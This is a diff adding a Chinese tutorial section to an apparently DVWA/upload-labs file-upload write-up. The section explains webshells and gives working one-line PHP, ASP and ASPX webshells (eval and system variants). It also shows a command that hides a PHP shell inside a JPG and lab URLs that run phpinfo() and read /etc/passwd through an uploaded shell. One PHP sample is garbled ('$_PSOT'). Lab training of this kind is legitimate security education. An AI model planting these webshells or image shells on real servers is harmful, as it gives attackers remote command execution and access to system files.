@@ -2733,3 +2733,118 @@ array(3){
 ![Pass21_10](./img/Pass21_10.PNG)
 
 ![Pass21_11](./img/Pass21_11.PNG)
+
+
+
+
+
+## 文件上传中webshell各类型和一句话木马和图片马制作教程
+
+### webshell
+
+> webshell就是以asp、php、jsp或者cgi等网页文件形式存在的一种代码执行环境，也可以将其称做为一种网页后门。黑客在入侵了一个网站后，通常会将asp或php后门文件与网站服务器 WEB目录下正常的网页文件混在一起，然后就可以使用浏览器来访问asp或者php后门，得到一个命令执行环境，以达到控制网站服务器的目的。
+
+
+
++ 小马：一句话木马也称为小马，即整个shell代码量只有一行，一般时系统执行函数
++ 大马：代码量和功能比小马多，一般会进入二次编码加密，防止被防火墙/入侵系统检测到
++ 图片马：一般直接上传木马文件都会被过滤拦截，这时候就需要用到图片马 。
+
+
+
+### php一句话木马
+
+~~~ php
+<?php @eval('$_PSOT['admin']);?>
+<?php eval($_REQUEST['admin']);?>
+<?php system($_REQUEST['admin']);?>
+~~~
+
+
+
+### asp一句话木马
+
+~~~ asp
+<%eval request ("admin")%>
+~~~
+
+
+
+### aspx一句话木马
+~~~ aspx
+<%@ Page Language="Jscript"%> <%eval(Request.Item["admin"],"unsafe");%>
+~~~
+
+
+
+#### 原理
+
+> 以 php 的一句话木马为例，<?php @eval ('$_PSOT['admin']);?> 语句能作为木马，其原理是利用 php 中的 eval 函数，将传入的任何语句作为 php 语句执行，因此当传入该木马时，通过访问该文件，以 post 方式传入参数，eval 函数再将接收的语句作为 php 语句执行，这就构成了连接。
+> 其中admin是一个变量名，用来接收语句，也可以称之为密码。
+> @ 在php中的作用是抑制错误提示。
+> 例如：加入已植入该木马，使用 POST 方式接收参数 phpinfo()，再通过 eval 将其作为php语句执行，就查看了站点的 php 信息。
+
+
+
+### 图片马
+
+>  所谓图片马，就是将一句话木马与图片相结合，使得图片中包含代码。
+
+
+
+使用语句 生成图片马：
+
+~~~ cmd
+copy 图片.jpg/b + 木马.php/a 木马.jpg
+/b 表示以二进制方式打开
+/a 表示以ASCII方式打
+~~~
+
+
+
+#### 介绍php的几种使用图片马方式
+
+> shell.php 使用php函数 菜刀连接
+
+~~~ php
+<?php @eval('$_PSOT['admin']);?>
+~~~
+
+![cb060b77e4179989ef4d5e80e2bdc44c](.\img\cb060b77e4179989ef4d5e80e2bdc44c.png)
+
+![b165046cd209495532461e8dc95b22fc](.\img\b165046cd209495532461e8dc95b22fc.png)
+
+
+
+> shell2.php #eval 使用php函数，例如phpinfo();
+
+~~~ php
+<?php eval($_REQUEST['admin']);?>
+~~~
+
+可以使用<code>hackbar</code>执行并<code>POST</code>下面的命令即可远程执行<code>phpinfo()</code>
+
+~~~ php
+http ://192.168.0.7/dvwa/hackable/uploads/shell.php?admin=phpinfo();
+~~~
+
+![a0cffca5a7e2357c11c4619463f848d9](.\img\a0cffca5a7e2357c11c4619463f848d9.png)
+
+> post是想用中国菜刀之类的工具连接获取shell，是C/S架构。
+> request 是在网页端输入变量访问图片吗所在网址[post]
+
+
+
+>  shell3.php #system使用linux 系统命令，例如ls，cat，rm，cp
+
+~~~ php
+<?php system($_REQUEST['admin']);?>
+~~~
+
+>  可以使用<code>hackbar</code>执行并<code>POST</code>下面的命令即可远程执行<code>phpinfo()</code>
+
+~~~ php
+http://192.168.8.134/dvwa /hackable/uploads/shell3.php?admin=cat /etc/passwd
+~~~
+
+![8fe8434b8e86a99980892063fca7f54b](.\img\8fe8434b8e86a99980892063fca7f54b.png)
